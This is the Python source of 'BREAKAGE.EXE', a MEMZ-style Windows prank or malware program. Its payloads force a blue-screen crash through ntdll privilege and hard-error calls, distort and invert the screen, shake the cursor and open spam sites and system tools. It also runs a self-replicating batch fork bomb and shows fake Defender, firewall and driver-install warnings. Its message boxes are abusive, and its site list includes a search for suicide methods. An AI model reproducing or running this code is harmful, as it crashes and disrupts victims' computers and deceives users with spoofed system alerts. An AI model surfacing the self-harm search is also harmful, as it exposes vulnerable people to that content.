# import winsound
# from win32gui import *
from win32api import *
from win32gui import *
from win32con import *
# from win32file import *
# import colorsys
import random
import os
from random import *
from threading import Thread as thread
from multiprocessing import Process as Thread, freeze_support
from time import sleep as sl, thread_time
from random import randrange as rd
import subprocess as sp
import ctypes
from pygame import mixer  # Load the popular external library
import time
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()

ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
class Data:
    IconWarning = LoadIcon(None, 32515)
    IconError = LoadIcon(None, 32513)
    def __init__(self):
        self.delay = 1500
        self.subtract = 10
        self.error_msgs = ["Antivirus has successfully parsed the following command:\n"
                      "    avcmdprse --disable --silent --add-whitelist BREAKAGE.EXE",
                           "You are an idiot!",
                           "Something happened.",
                           "You moved your mouse.\n"
                           "Please restart your computer to apply hardware changes",
                           "Still using this fucked up computer?",
                           "Watch this virus turn this computer into a digital hellscape",
                           "A message to the MBR, wait hes dead is'nt he...\n"
                           "Eh, watevs ill just tourture the partition data afterwards",
                           "Go check out the dev btw: \nhttps://www.github.com/syskill-the-coder/breakage-exe"
                           ]
        self.title = "BREAKAGE.EXE ON TOP"

    def __str__(self) -> str:
        return "What idiotic ####head would str() this class?"

    def sites(self, limit=0):
        """
        Returns a list of sites defined in Data.sites().
        If the limit is 0 or negative, then the limit is
        ignored and the full list is returned.
        """
        sites_in_memory = [
            "https://www.google.com/search?client=opera-gx&q=how+to+get+free+nitro&sourceid=opera&ie=UTF-8&oe=UTF-8",
            "https://www.google.com/search?client=opera-gx&q=virus+generator+legit+free+and+reliable&sourceid=opera&ie=UTF-8&oe=UTF-16",
            "https://bruhhub.com",
            "control && echo :die > oh_shit.bat && echo start control >> oh_shit.bat && echo goto die >> oh_shit.bat && echo start oh_shit.bat >> oh_shit.bat && start oh_shit.bat", #you know its bad when this b###h starts playing, a masterpiece oneliner
            "https://www.google.com/search?client=opera-gx&q=how+to+get+free+robux+legit+no+scam&sourceid=opera&ie=UTF-8&oe=UTF-8",
            "control",
            "http://google.co.ck/search?q=best+way+to+kill+yourself",
            "http://google.co.ck/search?q=how+2+remove+a+virus",
            "http://google.co.ck/search?q=mcafee+vs+norton",
            "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
            "http://google.co.ck/search?q=minecraft+hax+download+no+virus",
            "http://google.co.ck/search?q=how+to+get+money",
            "http://google.co.ck/search?q=bonzi+buddy+download+free",
            "http://google.co.ck/search?q=how+2+buy+weed",
            "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
            "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
            "http://google.co.ck/search?q=g3t+r3kt",
            "http://google.co.ck/search?q=batch+virus+download",
            "http://google.co.ck/search?q=virus.exe",
            "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
            "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2022",
            "http://google.co.ck/search?q=virus+builder+legit+free+download",
            "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
            "http://google.co.ck/search?q=how+to+remove+breakage+exe+virus",
            "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
            "http://google.co.ck/search?q=dank+memz",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://google.co.ck/search?q=half+life+3+release+date",
            "http://google.co.ck/search?q=is+illuminati+real",
            "http://google.co.ck/search?q=montage+parody+making+program+2016",
            "http://google.co.ck/search?q=the+memz+are+real",
            "http://google.co.ck/search?q=stanky+danky+maymays",
            "http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
            "http://google.co.ck/search?q=vinesauce+meme+collection",
            "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
            "http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
            "http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
            "http://play.clubpenguin.com",
            "http://pcoptimizerpro.com",
            "http://softonic.com",
            "calc",
            "notepad",
            "cmd",
            "write",
            "regedit",
            "explorer",
            "taskmgr",
            "msconfig",
            "mspaint",
            "devmgmt.msc",
            "control",
            "mmc",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe",
            "http://github.com/syskill-the-coder/breakage-exe"]

        if 0 >= limit:
            return sites_in_memory
        else:
            memory = []
            for i in range(limit):
                memory.append(sites_in_memory[i])
            return memory
    def tick(self):
        self.delay -= self.subtract
    def untick(self):
        self.delay += self.subtract
    def mainloop(self):
        while 1:
            if 0 >= self.delay:
                self.__init__()
            self.tick()
            if 0 >= self.delay:
                return False
            # print(f"Delay = {self.delay} Subtract = {self.subtract}") #comment this after debug
class Payloads():
    def __init__(self):
        self.data = Data()
    def sound(x):
        mixer.init()
        mixer.music.load('gaster.wav')
        while 1:
            mixer.music.play()
            while mixer.music.get_busy():  # wait for music to finish playing
                pass
            return
    def flash(x):
        HDC = GetDC(0)
        sw, sh = GetSystemMetrics(0), GetSystemMetrics(1)
        PatBlt(HDC, 0, 0, sw, sh, PATINVERT)
        Sleep(10)
        PatBlt(HDC, 0, 0, sw, sh, PATINVERT)
    def bsod(x):
        attempts = 1
        while 1:
            if not ntdll.NtRaiseHardError(0xDeaddead, 0, 0, 0, 6, ctypes.byref(res)):
                print("BSOD Successfull on attempt %s!" % attempts)
            else:
                print("Bsod payload failed, retrying... x %s" % attempts)
                attempts += 1
            if attempts > 10:
                raise PermissionError("Failed to raise bsod in 11 attempts")

    def open_sites(x):
        dataself = Data()
        dataself.time = 60000
        dataself.subtract = 1000
        while True:
            Sleep(dataself.time)
            sp.getoutput("start " + str(choice(dataself.sites)))
            dataself.tick()

    def blink_screen(x):
        global time
        global timeSubtract
        HDC = GetDC(0) # Get the first monitor
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) # Get screen width and height
        while True:
            Sleep(1000)
            PatBlt(HDC, 0,0,sw,sh, PATINVERT) # Invert the entire monitor! I know it sounds crazy!

    def error_drawing(x):
        HDC = GetDC(0) # First monitor
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) # Screen size
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning) # Draw the warning icon randomly on the screen
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos() # Cursor positions
                DrawIcon(HDC, mouseX, mouseY, Data().IconError) # Draw icon on mouse
    
    def screen_puzzle(x):
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        for i in range(30):
            x1 = rd(sw)
            y1 = rd(sh)
            x2 = rd(sw)
            y2 = rd(sh)
            width = rd(sw)
            height = rd(sh)
            BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
    def random_rgb_screen(x):
        HDC = GetDC(0)
        x = GetSystemMetrics(0)
        y = GetSystemMetrics(1)
        for i in range(1000):
            brush = CreateSolidBrush(RGB(
                rd(255),  # red
                rd(255),  # green
                rd(255)  # blue
            ))
            SelectObject(HDC, brush)
            PatBlt(HDC, 0, 0, x, y, PATINVERT)
            DeleteObject(brush)
            Sleep(60)
    def cursor_shake(x):
        while True:
            x,y = GetCursorPos() # Get cursor position

			# Calculate new cursor position
            newX = x + (rd(3)-1) * rd(int((1000+1)/20+2))
            newY = y + (rd(3)-1) * rd(int((1000+1)/20+2))

            SetCursorPos((newX,newY)) # Set the cursor position

    def tunnel_effect(x):
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        HDC = GetDC(0)
        while True:
            StretchBlt(HDC, rd(80), rd(80), sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
    def swing(s):
        left = True
        sw, sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0)
        while 1:
            if left:
                StretchBlt(HDC, -80, 10, sw, sh, HDC, 0, 10, sw, sh, SRCCOPY)
            else:
                StretchBlt(HDC, 80, -10, sw, sh, HDC, 0, -10, sw, sh, SRCCOPY)
            left = not left
            Sleep(50)

    def open_site(x):
        choice = __import__("random").choice(Data().sites())
        sp.getoutput("start %s" % choice)
    def spook(x):
        MessageBox(None, "Message from NT_AUTHORITY\\SYSTEM:\n"\
                                   "Your s��3M1\n"\
                                   "Oh shutup emergency backup system im in control here.\n"\
                                   "As system tried to tell you, your system is compromised lol so cry about it + l + get better + ur mom fat","System", MB_OK|MB_ICONERROR)
        MessageBox(None, "BREAKAGE.EXE Was allowed access to your keyboard.", "Windows Defender", MB_OK|MB_ICONINFORMATION)
        MessageBox(None, "BREAKAGE.EXE Was allowed access to your mouse.", "Windows Defender", MB_OK|MB_ICONINFORMATION)
        MessageBox(None, "BREAKAGE.EXE Was allowed access to your shell.", "cmd.exe",MB_OK | MB_ICONINFORMATION)
        MessageBox(None, "BREAKAGE.EXE Established a remote connection on port 450.", "Windows Firewall",MB_OK | MB_ICONINFORMATION)
        MessageBox(None, "BREAKAGE.EXE Failed to establish a remote connection on port 450.\n"
                         "The server declined the connection. The program is authorised to keep retrying silentley.", "Windows Firewall",MB_OK | MB_ICONERROR)
        if MessageBox(None, "Scared now little boi?", "BREAKAGE.EXE", MB_YESNO|MB_ICONQUESTION) == 7:
            MessageBox(None, "BREAKAGE.EXE Sucessfully installed kernel driver \"breakage_kernel_infecter_win32.sys\"","Driver Configuration", MB_OK|MB_ICONINFORMATION)
            MessageBox(None, f"Ill fucking crash the entire system {os.getlogin()}","BREAKAGE.EXE", MB_OK|MB_ICONINFORMATION)
        else:
            MessageBox(None, "Good.","",MB_OK|MB_ICONINFORMATION)
    def fill_memory(x):
        programs = ["C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                    "C:\\Windows\\System32\\control.exe",
                    "C:\\Windows\\System32\\calc.exe"
                    ]
        for i in range(6):
            for program in programs:
                print(sp.getoutput(f"start {program}"))
    def error(self):
        threads = []
        def target():
            MessageBox(None, choice(self.data.error_msgs), "BREAKAGE.EXE", MB_OK | MB_ICONERROR)
        for i in range(80):
            threads.append(thread(target=target))
        for t in threads:
            t.start()
            Sleep(500)


def qthread(target, name:str):
    targetthread = Thread(target=target)
    exec("""
global %s
%s = targetthread
%s.start()""" % (name,name,name))



# Payloads.tunnel_effect()
# Payloads.cursor_shake()
# Payloads.screen_puzzle()
# Payloads.error_drawing()
# Payloads.blink_screen()
# Payloads.open_site()
# Payloads.sound()
class Chains:
    ...
p = Payloads()
def beatflash():
    while 1:
        Payloads.flash()
        Sleep(1000)
if __name__ == "__main__":
    freeze_support()
    qthread(p.spook, "swing")



    # testthread.terminate()